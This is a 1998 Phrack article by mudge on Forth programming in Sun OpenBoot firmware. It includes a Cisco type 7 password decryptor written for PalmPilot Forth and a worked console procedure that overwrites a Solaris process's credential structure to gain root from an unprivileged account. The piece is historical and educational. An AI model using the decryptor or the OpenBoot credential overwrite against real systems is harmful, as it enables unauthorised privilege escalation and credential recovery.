@@ -1,0 +1,394 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="manifest" href="/site.webmanifest"><script src="/js/main.js" defer></script><script>
+      // Open links inside rendered markdown articles in a new tab
+      document.addEventListener('DOMContentLoaded', () => {
+        const md = document.querySelector('div.md-article-area');
+        if (md != null) {
+          Array.from(md.getElementsByTagName('a')).forEach((link) => {
+            if ((link.getAttribute('href') || '').startsWith('#')) return;
+            link.setAttribute('target', '_blank');
+          });
+        }
+      });
+    </script><meta http-equiv="content-language" content="en"><meta name="description" content="[Disclaimer - you can really mess up your system by mucking about with the information below if done incorrectly. Neither The L0pht, nor the author, take any accountability for mis-use of this information. Caution: Contents under pressure! ] So here it is, about 12:45am on a Monday morning. SpaceRogue from the l0pht just finished kicking my ass at"><meta name="robots" content="index,follow"><meta name="twitter:account_id" content="1745261389168496640"><meta name="twitter:site" content="@phrack"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Hacking in Forth"><meta name="twitter:description" content="[Disclaimer - you can really mess up your system by mucking about with the information below if done incorrectly. Neither The L0pht, nor the author, take any accountability for mis-use of this information. Caution: Contents under pressure! ] So here it is, about 12:45am on a Monday morning. SpaceRogue from the l0pht just finished kicking my ass at"><meta name="twitter:image" content="https://phrack.org/images/phrack-new.webp"><title>.:: Hacking in Forth ::.</title><meta property="og:type" content="article"><meta property="og:title" content="Hacking in Forth"><meta property="og:author" content="mudge"><meta property="og:description" content="[Disclaimer - you can really mess up your system by mucking about with the information below if done incorrectly. Neither The L0pht, nor the author, take any accountability for mis-use of this information. Caution: Contents under pressure! ] So here it is, about 12:45am on a Monday morning. SpaceRogue from the l0pht just finished kicking my ass at"><meta property="og:url" content="https://phrack.org/issues/53/hacking-in-forth.html"><link rel="canonical" href="https://phrack.org/issues/53/hacking-in-forth.html"><meta property="og:image" content="https://phrack.org/images/phrack-new.webp"><meta property="og:site_name" content="Phrack"><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Hacking in Forth","url":"https://phrack.org/issues/53/hacking-in-forth.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://phrack.org/issues/53/hacking-in-forth.html"},"author":{"@type":"Person","name":"mudge"},"datePublished":"1998-08-07","inLanguage":"en","description":"[Disclaimer - you can really mess up your system by mucking about with the information below if done incorrectly. Neither The L0pht, nor the author, take any accountability for mis-use of this information. Caution: Contents under pressure! ] So here it is, about 12:45am on a Monday morning. SpaceRogue from the l0pht just finished kicking my ass at","image":"https://phrack.org/images/phrack-new.webp","publisher":{"@type":"Organization","name":"Phrack","logo":{"@type":"ImageObject","url":"https://phrack.org/images/phrack-new.webp"}}}</script><!-- palette.css stays a plain static file (not a Vite import): the vendored intro pages
+         (public/phrack_hacktro.html, public/phrack_CFP.html) link it directly by URL and can't
+         go through the bundler, and the whole point of the palette/style split is that this file
+         is a symlink switched by hand — see "Switching theme" in README.md. --><link href="css/palette.css" rel="stylesheet" type="text/css"><link rel="stylesheet" href="css/Default.aGptptxO.css"></head><body id="top"><div align="center" class="texto-2-bold top-nav"><span>[ <a href="/news.html" title="News">News</a> ]</span><span>[ <a href="/issues/72/introduction_md.html" title="Issues">Issues</a> ]</span><span>[ <a href="/authors.html" title="Authors">Authors</a> ]</span><span>[ <a href="/archives/" title="Archives">Archives</a> ]</span><span>[ <a href="/contact.html" title="Contact">Contact</a> ]</span><span>[ <a href="#" title="Search" onclick="showSearchBox()">Search</a> ]</span></div><div class="blur-overlay" onclick="closeSearchBox()"><div class="search-container" onclick="event.stopPropagation()"><span onclick="closeSearchBox()" class="search-close-button">[ Close ]</span><input oninput="doSearch()" type="text" class="search-input" placeholder="Search titles or content..."><div class="search-results-box"><div class="search-message"><span>Enter something in the search box to see results</span></div></div></div></div><center><br><br><a href="/issues/72/introduction_md.html" title="Latest issue"><img width="494" src="/images/phrack-new.webp" alt="..[ Phrack Magazine ].." fetchpriority="high"></a><br><div role="main"><div style="padding-top: 4px; padding-bottom: 4px;"><div class="around"><div class="details"><strong>Issues</strong>:[ <a href="/issues/1/introduction.html" title="Issue 1">1</a> ][ <a href="/issues/2/phrack-inc-index.html" title="Issue 2">2</a> ][ <a href="/issues/3/index-1.html" title="Issue 3">3</a> ][ <a href="/issues/4/phrack-pro-phile.html" title="Issue 4">4</a> ][ <a href="/issues/5/phrack-v-intro.html" title="Issue 5">5</a> ][ <a href="/issues/6/index-1.html" title="Issue 6">6</a> ][ <a href="/issues/7/introindex.html" title="Issue 7">7</a> ][ <a href="/issues/8/phrack-inc-index.html" title="Issue 8">8</a> ][ <a href="/issues/9/introduction-to-phrack-inc-issue-nine.html" title="Issue 9">9</a> ][ <a href="/issues/10/introduction-to-phrack-10.html" title="Issue 10">10</a> ][ <a href="/issues/11/index-to-phrack-eleven.html" title="Issue 11">11</a> ][ <a href="/issues/12/index-of-phrack-12.html" title="Issue 12">12</a> ][ <a href="/issues/13/phrack-xiii-index.html" title="Issue 13">13</a> ][ <a href="/issues/14/introduction.html" title="Issue 14">14</a> ][ <a href="/issues/15/phrack-xv-intro.html" title="Issue 15">15</a> ][ <a href="/issues/16/phrack-16-intro.html" title="Issue 16">16</a> ][ <a href="/issues/17/phrack-xvii-introduction.html" title="Issue 17">17</a> ][ <a href="/issues/18/index-of-phrack-18.html" title="Issue 18">18</a> ][ <a href="/issues/19/phrack-inc-index.html" title="Issue 19">19</a> ][ <a href="/issues/20/phrack-xx-index.html" title="Issue 20">20</a> ][ <a href="/issues/21/index-1.html" title="Issue 21">21</a> ][ <a href="/issues/22/index-1.html" title="Issue 22">22</a> ][ <a href="/issues/23/phrack-inc-xxiii-index.html" title="Issue 23">23</a> ][ <a href="/issues/24/phrack-inc-xxiv-index.html" title="Issue 24">24</a> ][ <a href="/issues/25/phrack-inc-xxv-index.html" title="Issue 25">25</a> ][ <a href="/issues/26/phrack-inc-xxvi-index.html" title="Issue 26">26</a> ][ <a href="/issues/27/phrack-inc-xxvii-index.html" title="Issue 27">27</a> ][ <a href="/issues/28/phrack-inc-xxviii-index.html" title="Issue 28">28</a> ][ <a href="/issues/29/phrack-inc-xxix-index.html" title="Issue 29">29</a> ][ <a href="/issues/30/phrack-inc-xxx-index.html" title="Issue 30">30</a> ][ <a href="/issues/31/introduction-to-phrack-31.html" title="Issue 31">31</a> ][ <a href="/issues/32/phrack-classic-xxxii-index.html" title="Issue 32">32</a> ][ <a href="/issues/33/introduction-to-phrack-33.html" title="Issue 33">33</a> ][ <a href="/issues/34/introduction-to-phrack-34.html" title="Issue 34">34</a> ][ <a href="/issues/35/introduction-to-phrack-34.html" title="Issue 35">35</a> ][ <a href="/issues/36/introduction-to-diet-phrack-36.html" title="Issue 36">36</a> ][ <a href="/issues/37/introduction.html" title="Issue 37">37</a> ][ <a href="/issues/38/introduction.html" title="Issue 38">38</a> ][ <a href="/issues/39/introduction.html" title="Issue 39">39</a> ][ <a href="/issues/40/introduction.html" title="Issue 40">40</a> ][ <a href="/issues/41/introduction.html" title="Issue 41">41</a> ][ <a href="/issues/42/introduction.html" title="Issue 42">42</a> ][ <a href="/issues/43/introduction.html" title="Issue 43">43</a> ][ <a href="/issues/44/introduction.html" title="Issue 44">44</a> ][ <a href="/issues/45/introduction.html" title="Issue 45">45</a> ][ <a href="/issues/46/introduction.html" title="Issue 46">46</a> ][ <a href="/issues/47/introduction.html" title="Issue 47">47</a> ][ <a href="/issues/48/introduction.html" title="Issue 48">48</a> ][ <a href="/issues/49/introduction.html" title="Issue 49">49</a> ][ <a href="/issues/50/introduction.html" title="Issue 50">50</a> ][ <a href="/issues/51/introduction.html" title="Issue 51">51</a> ][ <a href="/issues/52/introduction.html" title="Issue 52">52</a> ][ <a href="/issues/53/introduction.html" class="current" title="Issue 53">53</a> ][ <a href="/issues/54/introduction.html" title="Issue 54">54</a> ][ <a href="/issues/55/introduction.html" title="Issue 55">55</a> ][ <a href="/issues/56/introduction.html" title="Issue 56">56</a> ][ <a href="/issues/57/introduction.html" title="Issue 57">57</a> ][ <a href="/issues/58/introduction.html" title="Issue 58">58</a> ][ <a href="/issues/59/introduction.html" title="Issue 59">59</a> ][ <a href="/issues/60/introduction.html" title="Issue 60">60</a> ][ <a href="/issues/61/introduction.html" title="Issue 61">61</a> ][ <a href="/issues/62/introduction.html" title="Issue 62">62</a> ][ <a href="/issues/63/introduction.html" title="Issue 63">63</a> ][ <a href="/issues/64/introduction.html" title="Issue 64">64</a> ][ <a href="/issues/65/introduction.html" title="Issue 65">65</a> ][ <a href="/issues/66/introduction.html" title="Issue 66">66</a> ][ <a href="/issues/67/introduction.html" title="Issue 67">67</a> ][ <a href="/issues/68/introduction.html" title="Issue 68">68</a> ][ <a href="/issues/69/introduction.html" title="Issue 69">69</a> ][ <a href="/issues/70/introduction.html" title="Issue 70">70</a> ][ <a href="/issues/71/introduction_md.html" title="Issue 71">71</a> ][ <a href="/issues/72/introduction_md.html" title="Issue 72">72</a> ]</div><div class="opt" align="center"><div class="rt"><a href="/archives/tgz/phrack53.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="/archives/tgz/phrack53.tar.gz" title="Get current issue tar.gz">53</a>&nbsp;|&nbsp;<strong>Release date</strong> : <b>1998-08-07</b>&nbsp;|&nbsp;<strong>Editor</strong> : <b>route</b></div><div class="framed"><table class="tissue" cellpadding="0" cellspacing="0"><tbody><tr><td align="left"><a href="/issues/53/introduction.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr><tr><td align="left"><a href="/issues/53/phrack-loopback.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr><tr><td align="left"><a href="/issues/53/line-noise.html#article">Line Noise</a></td><td align="right">various</td></tr><tr><td align="left"><a href="/issues/53/phrack-prophile-on-glyph.html#article">Phrack Prophile on Glyph</a></td><td align="right">Phrack Staff</td></tr><tr><td align="left"><a href="/issues/53/an-overview-of-internet-routing.html#article">An Overview of Internet Routing</a></td><td align="right">krnl</td></tr><tr><td align="left"><a href="/issues/53/ttcp-vulnerabilities.html#article">T/TCP Vulnerabilities</a></td><td align="right">route</td></tr><tr><td align="left"><a href="/issues/53/a-stealthy-windows-keylogger.html#article">A Stealthy Windows Keylogger</a></td><td align="right">markj8</td></tr><tr><td align="left"><a href="/issues/53/linux-trusted-path-execution-redux.html#article">Linux Trusted Path Execution redux</a></td><td align="right">K. Baranowski</td></tr><tr><td align="left"><a href="/issues/53/hacking-in-forth.html#article">Hacking in Forth</a></td><td align="right">mudge</td></tr><tr><td align="left"><a href="/issues/53/interface-promiscuity-obscurity.html#article">Interface Promiscuity Obscurity</a></td><td align="right">apk</td></tr><tr><td align="left"><a href="/issues/53/watcher-nids-for-the-masses.html#article">Watcher, NIDS for the masses</a></td><td align="right">hacklab</td></tr><tr><td align="left"><a href="/issues/53/the-crumbling-tunnel.html#article">The Crumbling Tunnel</a></td><td align="right">Aleph1</td></tr><tr><td align="left"><a href="/issues/53/port-scan-detection-tools.html#article">Port Scan Detection Tools</a></td><td align="right">Solar Designer</td></tr><tr><td align="left"><a href="/issues/53/phrack-world-news.html#article">Phrack World News</a></td><td align="right">disorder</td></tr><tr><td align="left"><a href="/issues/53/extractc.html#article">extract.c</a></td><td align="right">Phrack Staff</td></tr></tbody></table><h1 class="opt" id="article"><strong>Title</strong> : Hacking in Forth</h1><div class="opt-bottom"><strong>Author</strong> : mudge</div><pre>---[  Phrack Magazine   Volume 8, Issue 53 July 8, 1998, article 09 of 15
+
+
+-------------------------[  FORTH Hacking on Sparc Hardware
+
+
+--------[  mudge &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a5c8d0c1c2c0e5c995d5cdd18bc6cac8">[email&#160;protected]</a>&gt;
+
+
+                         L0pht Heavy Industries
+                        [ http://www.L0pht.com ]
+                               presents
+
+                    FORTH Hacking on Sparc Hardware
+                            <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5b362e3f3c3e1b376b2b332f75383436">[email&#160;protected]</a>
+
+
+[Disclaimer - you can really mess up your system by mucking about with
+ the information below if done incorrectly. Neither The L0pht, nor
+ the author, take any accountability for mis-use of this information.
+ Caution: Contents under pressure! ]
+
+So here it is, about 12:45am on a Monday morning.  SpaceRogue from the l0pht
+just finished kicking my ass at darts the entire night although I managed to
+enjoy myself anyway due to a plethora of Guinness.  Route has been breathing
+down my neck for an article for PHRACK and since the one I proposed to him
+last time we both deemed as completely morally irresponsible (after all, we
+like it that the Internet works on a _somewhat_ consistent basis), I find
+myself dredging up bizarre tricks and knickknacks that I&#x27;ve been playing with.
+
+FORTH.  Well, I could say it&#x27;s the wave of the future but is has been around
+a long time and doesn&#x27;t seem to be gaining tremendous popularity.  However, it
+turns out that it is an incredibly interesting programming language that,
+whether you know it or not, plays a very key roll in some of our favorite
+hardware.  Sun Microsystems uses forth for their OpenBoot implementation.
+What this means is that when you power on anything from an old Sun 3/60 that
+is based off of the Motorola 680X0 to an UltraSparc Server based off of the
+UltraSparc 64 bit processor, the hardware and initial bootstrapping code is
+handled by a FORTH interpreter.
+
+For a long time it was infrequent that a hacker would actually be able to lay
+their hands, legitimately, on a piece of Sun hardware and play with the
+OpenBoot prom.  Nowadays I have watched companies throw out older Sun 2&#x27;s,
+Sun 3&#x27;s and even Sparc ELC and IPC&#x27;s in large quantities.  Frequenting your
+local Ham Radio or Tech flea markets can usually yield an older Sun system for
+extremely short cash.  Then again, if you work around them you have &quot;free&quot;
+access to play with the hardware and sometimes that&#x27;s what the game is all
+about.
+
+As it turns out I happen to have a Sparc at home, at the l0pht, and at work.
+The first two were trash picked and the third is just due to the fact that
+I stopped flipping burgers and decided to make the same amount of money
+doing something I&#x27;m more interested in (grin).  Yes, there are plenty of holes
+still around in Solaris, SunOS, and the other operating systems that run on
+the Sparc architecture (such as NeXTSTEP and the *BSD&#x27;s) but it&#x27;s always fun
+to see how the system starts up as almost nobody seems to think about security
+at that point.  In this article we will start by writing a simple program to
+turn the LED light on the hardware on and off.  We will then write a cisco
+type 7 password decryptor for Pforth - which is a FORTH interpreter written
+for the 3Com PalmPilot PDA.  At that point I will show how to change the
+credential structure of a running process to 0 (root).
+
+FORTH is a very simple, yet powerful language.  It is tremendously small and
+compact which lends it extremely well to embedded systems.  This is one of the
+main reasons that the bootstrapping of hardware and software on Suns is done
+in FORTH.  If you have ever used a scientific, or often referred to as &quot;Reverse
+Polish Notation&quot;, calculator then you understand the stack based premise
+behind FORTH.
+
+[elapsed time 1.5 weeks]
+
+EEEKS!  So I&#x27;m rummaging through some of my files and find that I&#x27;ve been
+neglect in my duties of finishing this article...  One moment, one more glass
+of port (it&#x27;s always good to move on to port after a few beers...).  Ahh. Ok,
+on to some basic Forth examples to get everybody in the right mindset. Let&#x27;s
+try the old standard of 2+3.
+
+In stack based notation this is expressed as 2 3 +.  Think of every element
+being pushed onto the stack and then operands dealing with the top layers in
+reverse order.  Thus, 2 pushes the number 2 on the stack, 3 pushes the number
+3 on the stack, and + says take the top two numbers off of the stack and
+push the result on to the stack in their place [diagram 1].
+
+[diagram 1]
+
+     2    3   +
+
+   ---   ---   ---
+  | 2 | | 3 | | 5 |
+   ---  |---|  ---
+        | 2 |
+         ---
+
+[note: to pop the top of the stack and display it on the screen type &#x27;.&#x27;]
+
+
+Simple?  You bet.  Try it out on your favorite piece of Sun hardware.  L1-A
+(the L1 key might be labeled &#x27;Stop&#x27;) give the following a shot:
+
+&lt;++&gt; EX/4th/blink.4
+ok :light-on
+     1 aux@ or aux! ;
+ok :light-off
+     1 invert aux@ and aux! ;
+ok
+&lt;--&gt;
+
+Now when you type light-on, the led on the front of the Sparc turns on.
+Conversely, light-off turns the led off.  On installations with OpenBoot 3.x
+I believe this is a built in FORTH word as led-on and led-off.  Older versions
+of OpenBoot don&#x27;t have this built in word - but now you can add it.
+
+Here&#x27;s what all of the above actually means -
+   :light-on  - this marks the beginning of a new word definition which ends
+                when a semi-colon is seen.
+   1          - pushes 1 on the stack.
+   aux@       - takes the value stored in the aux register and pushes it
+                onto the stack.
+   or         - takes the top two values from the stack, OR&#x27;s them and leaves
+                the result in their place.
+   aux!       - takes the value on the top of the stack and writes it to the
+                aux register.
+   ;          - ends the word definition.
+
+   :light-off - this marks the beginning of a new word definition which ends
+                when a semi-colon is seen.
+   1          - pushes 1 on the stack.
+   invert     - inverts the bits or the value on the top of the stack
+   aux@       - takes the value stored in the aux register and pushes it
+                onto the stack.
+   and        - takes the top two values from the stack, AND&#x27;s them and leaves
+                the result in their place.
+   aux!       - takes the value on the top of the stack and writes it to the
+                aux register.
+   ;          - ends the word definition.
+
+ [note - you can see the disassembly of the led-on / led-off words, if they
+         are in your openboot with &#x27; ok led-on (see)&#x27; ]
+
+----
+
+The PalmPilot is a rockin&#x27; little PDA based off of the Motorola 68328
+(DragonBall) processor.  At the L0pht we all went out and picked up PalmPilots
+as soon as we saw all of the wonderful unused features of the Motorola
+processor in it.  Ahhhh, taking us back to similar feelings of messing about in
+the 6502.
+
+PForth is a bit different from the OpenBoot forth implementation in some minor
+ways - most notably in the default input bases and how words such as &#x27;abort&#x27;
+are handled.  I figured a little app for the Pilot in FORTH might help people
+see the usefulness of the language on other devices than the Sun firmware.
+The porting of this to work in an OpenBoot environment is left as an exercise
+to the reader.
+
+The cisco type 7 password decryptor is a bit more complex than the led-on /
+light-on example above [see the book references at the end of this article for
+a much more thorough explanation of the FORTH language].
+
+--begin cisco decryptor--
+&lt;++&gt; EX/4th/cisco_decryptor.4
+\ cisco-decrypt
+
+include string
+( argh! We cannot _create_ the )
+( constant array as P4th dies )
+( around the 12th byte - )
+( thus the ugliness of setting it )
+( up in :main   .mudge)
+
+variable ciscofoo 40 allot
+variable encpw 60 allot
+variable decpw 60 allot
+variable strlen
+variable seed
+variable holder
+
+:toupper ( char -- char )
+ dup dup 96 &gt; rot 123 &lt; and if
+ 32 -
+ then ;
+
+:ishexdigit ( char -- f )
+ dup dup 47 &gt; rot 58 &lt; and if
+  drop - 1
+ else
+  dup dup 64 &gt; 71 &lt; and if
+  drop - 1
+ else
+  drop 0 then then ;
+
+:chartonum ( char -- i )
+ toupper
+ dup ishexdigit 0= if
+  abort&quot; contains invalid char &quot;
+ then
+ dup
+ 58 &lt; if
+  48 -
+ else
+  55 -
+ then ;
+
+:main
+100 ciscofoo 0 + C!
+115 ciscofoo 1 + C!
+102 ciscofoo 2 + C!
+100 ciscofoo 3 + C!
+59 ciscofoo 4 + C!
+107 ciscofoo 5 + C!
+115 ciscofoo 6 + C!
+111 ciscofoo 7 + C!
+65 ciscofoo 8 + C!
+44 ciscofoo 9 + C!
+46 ciscofoo 10 + C!
+105 ciscofoo 11 + C!
+121 ciscofoo 12 + C!
+101 ciscofoo 13 + C!
+119 ciscofoo 14 + C!
+114 ciscofoo 15 + C!
+107 ciscofoo 16 + C!
+108 ciscofoo 17 + C!
+100 ciscofoo 18 + C!
+74 ciscofoo 19 + C!
+75 ciscofoo 20 + C!
+68 ciscofoo 21 + C!
+
+32 word count (addr + 1, strlen )
+strlen!
+
+encpw strlen @ cmove&gt; drop
+
+cr
+
+( make sure the string is &gt; 3 chars )
+strlen @ 4 &lt; if abort&quot; short input&quot;
+then
+
+strlen @ 2 mod ( valid encpw&#x27;s )
+( must have even number of chars )
+0= 0= if abort&quot; odd input&quot; then
+
+encpw C@ 48 - 10 *
+encpw 1 + C@ 48 - + seed!
+
+seed @ 15 &gt; if abort&quot; incalid seed&quot;
+then
+
+0 holder !
+
+strlen @ 1 + 2 do
+ i 2 = 0= i 2 mod 0= and if
+  holder @ ciscofoo seed @ + C@ xor
+  emit
+  seed @ 1 + seed !
+  0 holder !
+  i strlen @ = if
+   cr quit then
+  then
+
+  i 2 mod 0= if
+  encpw i + C@ chartonum 16 *
+  holder !
+ else
+  encpw i + C@ chartonum holder @ +
+  holder !
+ then
+
+loop ;
+&lt;--&gt;
+
+--end cisco decryptor--
+
+Ok - after that brief little excursion we return to the Sparc hardware.
+
+So, how can this information be used from a more traditional hacking
+standpoint?  Let&#x27;s say you are sitting in front of a nice system running
+Solaris but for whatever reason you only have an unprivileged account.  Since
+there is not any setup in the hardware to delineate different users and their
+ability to access memory (well, not in the way you think about it inside of
+Unix processes) you really have free roam of the system.
+
+Each process is allocated a structure defining various aspects about itself.
+This is needed when processes are swapped out and in to memory.  As a regular
+user you really aren&#x27;t allowed to muck about in this structure but a quick
+L1-A will get us around all of that. Peeking into /usr/include/sys/proc.h
+shows that what we are really after is the process credentials structure.
+This is located after a pointer to a vnode, a pointer to the process address
+space, and two mutex locks.  At that point there is a pointer to a cred struct
+which has the process credentials.  Inside the process credentials structure
+you find :
+
+     reference count     (long)
+     effective user id   (short)
+     effective group id  (short)
+     real user id        (short)
+     real group id       (short)
+     &quot;saved&quot; user id     (short)
+     &quot;saved&quot; group id    (short)
+     etc...
+
+Eyes lighting up yet?  All of these variables are accessible when you are at
+the command prompt.  The first thing that you need to figure out is the start
+of the proc structure for a given process ID (PID).  Let&#x27;s assume I have a
+shell running (tcsh in this case).  In tcsh and csh the PID of the shell is
+stored in $$.
+
+    Alliant+ ps -eaff | grep $$
+    mudge   914   913  1 15:29:31 pts/5    0:01 tcsh
+
+Sure enough, that&#x27;s my tcsh. Now simply use ps to find the beginning of
+the proc structure:
+
+    Alliant+ ps -lp $$
+    F S   UID   PID  PPID  C PRI NI     ADDR     SZ    WCHAN TTY      TIME CMD
+    8 S   777   914   913  0  51 20 f5e09000    436 f5e091d0 pts/5    0:01 tcsh
+
+You can find the layout of your proc structure in /usr/include/sys/proc.h.
+From this it is apparent that the pointer to the credential structure is
+located 24 bytes into the proc struct. In the above example that means the
+pointer is at 0xf5e09000 + 0x18 or 0xf5e09018.  The credential struct is
+listed in /usr/include/sys/cred.h.  From this we note that the effective user
+id is 4 bytes into the cred structure.
+
+Just so you can see that there&#x27;s nothing hidden up my sleeves -
+
+    Alliant+ id
+    uid=777(mudge) gid=1(other)
+
+Fire up the trusty OpenBoot system via L1-A and get the pointer to the
+cred structure via :
+
+ok hex f5e09000 18 + l@ .
+f5a99858
+ok go
+
+Now, get the effective user id by
+ok hex f5a99858 4 + l@ .
+309   (309 hex == 777 decimal)
+ok go
+
+Of course you want to change this to 0 (euid root):
+ok hex 0 f5a99858 4 + l!
+ok go
+
+check your credentials!
+
+Alliant+ id
+uid=777(mudge) gid=1(other) euid=0(root)
+
+If you want to change the real user id it would be an offset of 12 (0xc):
+
+ok hex 0 f5a99858 c + l!
+ok go
+
+Alliant+ id
+uid=0(root) gid=1(other)
+
+Needless to say, there&#x27;s a whole different world living inside that hardware
+in front of you that is begging to be played and fiddled with.  Keep in mind
+that you can do serious damage by mucking around in there though.
+
+enjoy,
+
+<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="305d45545755705c004058441e535f5d">[email&#160;protected]</a>
+---
+http://www.l0pht.com
+---
+
+Some excellent FORTH books that you should get to learn more about this are:
+
+    Starting FORTH, Leo Brodie, Prentice-Hall, Inc. ISBN 0-13-842922-7
+    OpenBoot 3.x Command Reference Manual, SunSoft [get from a Sun Reseller]
+
+    Pilot FORTH was written by Neal Bridges (<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e78985958e83808294a78e899382958b8880c984888a">[email&#160;protected]</a>) -
+    http://www.interlog.com/~nbridges
+
+
+----[  EOF
+
+</pre></div></div></div></div></center><div align="center" class="texto-2-bold">[ <a href="/news.html" title="News">News</a> ] [ <a href="/issues/72/introduction_md.html" title="Issues">Issues</a> ] [ <a href="/authors.html" title="Authors">Authors</a> ] [ <a href="/archives/" title="Archives">Archives</a> ] [ <a href="/contact.html" title="Contact">Contact</a> ]</div><div align="right" class="texto-1">&copy; Copyleft 1985-2026, Phrack Magazine.</div><!-- Cloudflare Pages Analytics --><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d2d1781c40ba474f9b1495557de1faa0"}'></script><!-- Cloudflare Pages Analytics --></body></html>
